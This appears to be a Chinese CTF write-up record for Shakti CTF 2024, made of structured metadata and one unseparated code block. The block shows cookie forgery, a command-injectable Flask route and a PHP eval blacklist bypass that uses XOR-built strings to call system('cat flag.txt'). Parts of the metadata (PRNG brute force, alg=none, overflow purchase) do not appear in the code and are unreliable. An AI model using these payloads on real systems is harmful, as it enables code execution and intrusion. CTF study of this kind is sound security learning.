---
title: Shakti CTF (2024) Writeup
contest: Shakti CTF
year: 2024
difficulty: medium
vuln_type: web_unknown
tags:
- cookie-forge
- command-injection
- jwt-none
- eval-restricted
- xor-obfuscation-php
attack_chain:
- Cookie 解析 admin=0 → 1 base64 改 admin 标志
- 路由 / first_num 泄露伪随机种子
- seed 爆破 1e6-9e6 → second_num
- JWT secret=222333 HS256 弱密码
- 算法改 alg=none 绕签名
- product_id 整数溢出购买 -1
- checkout cookie shopping_token 含 amount 字段改 1e9
- PHP preg_match 限制 eval 但可 XOR 字符串拼接
- 111114" ^ "BHBETY" = "system
- 111q1411w111" ^ "RPEQWXPVYEIE" = "cat flag.txt
- 注入 eval("("111114"^"BHBETY")("111q1411w111"^"RPEQWXPVYEIE")")
key_payload: eval(("111114"^"BHBETY")("111q1411w111"^"RPEQWXPVYEIE"))
one_liner: Shakti CTF 2024 混合题：Cookie 伪造 + JWT 爆破 + PHP 异或绕过黑名单。
lesson: PHP preg_match 黑名单在过滤单字符时常用 XOR/自增绕过。
quality: medium
full_path: Shakti_CTF_(2024)_Writeup.full.md
meta_path: Shakti_CTF_(2024)_Writeup.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: Shakti CTF (2024) Writeup。Shakti CTF 2024 混合题：Cookie 伪造 + JWT 爆破 + PHP 异或绕过黑名单。。关键路径：Cookie 解析 admin=0 → 1 base64 改 admin 标志 → 路由 / first_num 泄露伪随机种子 → seed 爆破 1e6-9e6 → second_num。经验：PHP preg_matc...
category: web
subcategory: web_other
tools_used:
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/166696.html
reasoning_chain:
- 'Set-Cookie: eyJhZG1pbiI6MH0= (base64 {"admin":0}) → 触发点：Cookie 伪造'
- 动作：改 admin=1 → 观察：admin 页面解锁
- PRNG 预测：first_num leak seed → 假设：seed 范围 1e6-9e6 可遍历
- 动作：遍历 random.seed + random.randint 找 second_num → 观察：匹配即过
- JWT secret=222333 HS256 → 假设：弱密码 → 动作：爆破 → 改 amount=1e9
- PHP preg_match 黑名单 + eval → 假设：XOR 字符串绕过
- 动作：'111114'^'BHBETY'='system', '111q1411w111'^'RPEQWXPVYEIE'='cat flag.txt'
- 'payload: eval((''111114''^''BHBETY'')(''111q1411w111''^''RPEQWXPVYEIE''))'
failed_attempts:
- 试图直接 base64 decode cookie 改 admin → 失败：未编码 base64 不可用
- 试图用 system('cat flag.txt') 直接 eval → 失败：被 preg_match 关键词黑名单拦截
key_observations:
- PHP preg_match 黑名单在过滤单字符时常用 XOR/自增绕过
- Python random.seed + random.randint 是 PRNG 预测经典组合
- JWT secret 短密码 (<6 位) 可爆破 (hashcat/jwt_tool)
- JWT amount 字段整数溢出购买是电商常见逻辑漏洞
prerequisites:
- PHP preg_match 黑名单绕过技巧
- Python random PRNG 预测
- JWT 弱密码爆破 (HS256)
- XOR 字符串构造算法
---
# Shakti CTF (2024) Writeup

> 原文: https://www.ctfiot.com/166696.html
> ID: 166696


```
Set-Cookie: cookie=eyJhZG1pbiI6MH0%3D; Path=/
GET / HTTP/2
Host: ch23900160354.ch.eng.run
Cookie: cookie=eyJhZG1pbiI6MX0%3D
@app.get('/')
def index():
 test = request.args.get('test', None)
 if test is None:
 return render_template('index.html')

 command = f"find {test}"

 try:
 output = os.popen(command).read()
POST /buy HTTP/2
Host: ch11900160369.ch.eng.run
Content-Length: 12
Content-Type: application/x-www-form-urlencoded

product_id=4
GET /checkout HTTP/2
Host: ch11900160369.ch.eng.run
Cookie: shopping_token=eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJhbW91bnQiOiA1MDAwfQ.qdH04CeYzu_qZoL2gBNdEsmtc3XKME6wAFw7CdjId5E
<?php
highlight_file(__FILE__);
$command = $_GET['command'] ?? '';

if($command === '') {
 die("Please provide a command\n");
}

function filter($command) {
 if(preg_match('/(`|\.|\$|\/|a|c|s|require|include)/i', $command)) {
 return false;
 }
 return true;
}

if(filter($command)) {
 eval($command);
 echo "Command executed";
} else {
 echo "Restricted characters have been used";
}
echo "\n";
?>
# ref: https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md

    #string_code = ['system','ls'] # -> ("111114"^"BHBETY")("41"^"XB")
string_code = ['system','cat flag.txt'] # -> ("111114"^"BHBETY")("111q1411w111"^"RPEQWXPVYEIE")
obfuscated_code = ""
charset = "1234567890qwertyuiopdfghjklzxvbnmQWERTYUIOPDFGHJKLZXVBNM"

for code in string_code:
 obfuscated = ""
 set_a = ""
 set_b = ""
 for i in code:
 ok = False
 for j in charset:
 for k in charset:
 if ord(j)^ord(k) == ord(i):
 set_a += j
 set_b += k
 ok = True
 break
 if ok:
 break
 obfuscated_code += f'("{set_a}"^"{set_b}")'
print(''.join(["(\"%s\")" % i for i in string_code]) + '=' + obfuscated_code)
```
